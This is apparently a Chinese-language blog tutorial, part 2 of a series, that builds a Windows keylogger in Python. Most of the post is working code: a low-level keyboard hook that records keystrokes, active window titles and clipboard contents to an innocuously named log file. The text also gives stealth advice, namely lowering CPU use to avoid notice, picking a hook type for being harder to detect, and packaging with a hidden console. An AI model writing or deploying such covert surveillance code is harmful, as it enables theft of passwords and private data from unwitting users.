---
title: 建立键盘记录器part2
description: 使用python编写键盘记录器.
categories:
 - python
tags: 
 - python
 - 渗透测试
---

>part1使用while True死循环来时时监听用户敲击使得cpu占用率较高，容易被察觉。而part2则使用当用户敲击时触发来解决，且part2使用了`SetWindowsHookExa`在基于事情方法的性能要优于part1使用的`GetAsncKeyState`。

#### 加载库，初始化变量

加载 `user32.dll` 和`kernel32.dll`，设置日志记录并创建变量以保存文本，窗口标题和按下的键。

```python
from ctypes import *
from ctypes.wintypes import DWORD, LPARAM, WPARAM, MSG
import logging
import os

logging.basicConfig(filename=(os.environ['localappdata'] +"\\" + 'applog.txt'), level=logging.DEBUG, format='%(message)s')

#加载所需库
user32 = windll.user32
kernel32 = windll.kernel32


current_window = None   # 窗口标题
current_clipboard = []  # 剪贴板内容
last_key = None         # 最后一个按键
line = ""               # 点击的键盘字符行
```

我们要利用钩子函数`SetWindowsHookExa`，`UnhookWindowsHookEx`和`CallNextHookEx`还需要一个类用作数据结构，以保存来自KBDLLHOOKSTRUCT结构的键盘输入事件中的数据。
我们先声明一些常量，以后调用WinAPI函数时使用。

```python
WH_KEYBOARD_LL = 13     # 键盘钩子用于SetWindowsExa
WM_KEYDOWN = 0x0100
HC_ACTION = 0
```

`SetWindowsHookExa`需要知道它必须设置什么类型的钩子，我们使用`WH_KEYBOARD_LL`( 用来对底层的键盘输入事件进行监视，[详情参见](https://docs.microsoft.com/zh-cn/windows/win32/winmsg/about-hooks?redirectedfrom=MSDN))因为它不需要在进程中注入DLL，较难捕获。`WM_KEYDOWN`告诉我们何时按下非系统键。`GC_ACTION`是传递给`KeyboardProc`回调函数的参数

#### 使用虚拟键检测按下的特殊键

将虚拟键映射到它们各自的十六进制值，并创建`HOOKPROC`回调函数。[虚拟键值参考](http://nehe.gamedev.net/article/msdn_virtualkey_codes/15009/)

```python
VIRTUAL_KEYS = {'RETURN': 0x0D,
                'CONTROL': 0x11,
                'SHIFT': 0x10,
                'MENU': 0x12,
                'TAB': 0x09,
                'BACKSPACE': 0x08,
                'CLEAR': 0x0C,
                'CAPSLOCK': 0x14,
                'ESCAPE': 0x1B,
                'HOME': 0x24,
                'INS': 0x2D,
                'DEL': 0x2E,
                'END': 0x23,
                'PRINTSCREEN': 0x2C,
                'CANCEL': 0x03
                }

HOOKPROC = WINFUNCTYPE(HRESULT, c_int, WPARAM, LPARAM)
```

我们需要数据结构来保存有关键盘输入事件的信息。这里MSDN提供了结构，[参考](https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/ns-winuser-kbdllhookstruct)

```python
class KBDLLHOOKSTRUCT(Structure): _fields_=[
    ('vkCode',DWORD),
    ('scanCode',DWORD),
    ('flags',DWORD),
    ('time',DWORD),
    ('dwExtraInfo',DWORD)]
````

#### 安装钩子来监听键盘事件

创建一个名为`hook`的类，该类通过安装钩子来监听键盘事件。

```python
class hook:

    #用于安装/卸载钩子

    def __init__(self):
        #调用user32.dll和kernel32.dll
        self.user32 = user32
        self.kernel32 = kernel32
        self.is_hooked = None


    def install_hook(self, ptr):
        #安装钩子
        self.is_hooked = self.user32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            ptr,
            kernel32.GetModuleHandleW(None),
            0
        )

        if not self.is_hooked:
            return False
        return True

    def uninstall_hook(self):
        #卸载钩子
        if self.is_hooked is None:
            return
        self.user32.UnhookWindowsHookEx(self.is_hooked)
        self.is_hooked = None
```

`is_hooked`变量用于保存挂钩过程的句柄`SetWindowsHookExA`。
`install_hook`方法用于安装钩子调用`SetWindowsHookExA`
`uninstall_hook`方法用于卸载钩子。测试键盘记录程序时使用

#### get_current_window()和get_clipboard()

用到part1抓取窗口标题与剪贴板数据。

```python
def get_current_window():    #抓取当前窗口标题
    #必需的WinAPI函数
    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow()    #获取当前窗口句柄
    length = GetWindowTextLength(hwnd)    #获取标题文本长度，将句柄乍为参数传递
    buff = ctypes.create_unicode_buffer(length + 1)    #创建临时缓存buff用于存储标题文本

    GetWindowText(hwnd, buff, length + 1)    #获取窗口标题并存储在buff中

    return buff.value    #返回buff的值

def get_clipboard():

    CF_TEXT = 1    #设置剪贴板格式

    #GlobalLock/GlobalUnlock 参数与返回类型
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]

    #GetClipboardData的返回类型
    user32.GetClipboardData.restype = ctypes.c_void_p
    user32.OpenClipboard(0)

    #所需剪贴板函数
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(CF_TEXT):    #如果CF_TEXT可用
            data = GetClipboardData(CF_TEXT)    #获取剪贴板数据的句柄
            data_locked = kernel32.GlobalLock(data)    #获取指向数据所在的内存位置的指针
            text = ctypes.c_char_p(data_locked)    #获取指向data_locked位置的char*(python中的字符串)指针
            value = text.value    #存储有用的值
            kernel32.GlobalUnlock(data_locked)    #递减锁计数
            return value.decode('utf-8')    #返回剪贴板的值
    finally:
        CloseClipboard()    #关闭剪贴板
```

#### 键盘事件发生调用的钩子程序

声明全局变量，这样每次点击按键时被清空。

```python
def hook_procedure(nCode, wParam, lParam):

    global last_key
    global current_clipboard
    global line
    global current_window
```

与part1同，我们需要知道用户键入时当前窗口，以便我们如果使用检索到的数据。每当按下特定键里，我们可以使用函数来卸载钩子(此处为`CONTROL`)

```python
if current_window != get_current_window():    #判断current_window内容不是当前打开的窗口
    current_window = get_current_window()    #将窗口标题放在current_window中
    logging.info('[WINDOW] ' + current_window)    #将当前窗口标题写入日志文件


#如果你在测试时想卸载钩子，请删除下面注释
"""
if user32.GetKeyState(VIRTUAL_KEYS['CONTROL']) & 0x8000:
    hook.uninstall_hook()
    return 0
"""
```

```python
if nCode == HC_ACTION and wParam == WM_KEYDOWN:
    kb = KBDLLHOOKSTRUCT.from_address(lParam)
    user32.GetKeyState(VIRTUAL_KEYS['SHIFT'])
    user32.GetKeyState(VIRTUAL_KEYS['MENU'])
    state = (c_char * 256)()
    user32.GetKeyboardState(byref(state))
    buff = create_unicode_buffer(8)
    n = user32.ToUnicode(kb.vkCode, kb.scanCode, state, buff, 8 - 1, 0)    #ToUnicode返回值：-1/一个死键,0/不进行任何转换,1/一个字符,>=2/两个或多个字符
    key = wstring_at(buff)
```

这里的逻辑是，当按下一个键时，我们调用之前创建的类`from_address`来获取有关键盘事件的信息，并将其`kb`作为数据结构存储在变量中`KBDLLHOOKSTRUCT`。创建一个`state`大小为256的变量来保存所有256个虚拟键的状态。这里调用`GetKeyboardState()`函数来完成。然后我们声明一个`Buff`变量以创建Unicode字符缓冲区(具有wchar数据类型的值的数组)。我们使用`ToUnicode`函数将虚拟按键代码或键盘状态转换为Unicode字符，然后使用`wstring_at()`将字符存储为1个字符的Unicode字符串。

`ToUnicode`返回值存储在n中。每当按下一个键里钩子过程会存储一个返回值，我们可以使用它来确定是否记录字符。只要n大于0，我们就记录按下的键。
```python
    if n > 0:
        if kb.vkCode not in VIRTUAL_KEYS.values():    #如果键入非特殊键，则加入line变量
            line += key

        for key, value in VIRTUAL_KEYS.items():    #如果键入特殊键，则记录特殊键名
            if kb.vkCode == value:
                logging.info(key)

        if kb.vkCode == VIRTUAL_KEYS['RETURN']:    #如果键入RETURN，则记录并清除line变量
            logging.info(line)
            line = ""

        if current_clipboard != get_clipboard():    #如果剪贴板中有新数据，则记录该数据
            current_clipboard = get_clipboard()
            logging.info('[CLIPBOARD] ' + current_clipboard + '\n')

return user32.CallNextHookEx(hook.is_hooked, nCode, wParam, lParam)    #将钩子信息传递给下个钩子过程CallNextHookEx
```

#### last

创建`hook`类实例，创建指针`ptr`，安装钩子`install_hook(ptr)`，等待钩子截获系统信息。

```python
hook = hook()
ptr = HOOKPROC(hook_procedure)
hook.install_hook(ptr)
msg = MSG()
user32.GetMessageA(byref(msg), 0, 0, 0)
```

用pyinstaller将文件打包成exe，可以用参数-w/--noconsole来隐藏dos窗口

解决part1的cpu占用率高问题，但未解决右键复制获取剪粘板数据。

![part2_1](https://yui77111.github.io/assets/images/article/python/2_1.png)

![part2_2](https://yui77111.github.io/assets/images/article/python/2_2.png)


源代码已上传致[gayhub](https://github.com/yui77111/python-malware/blob/master/keylogger/part2.py)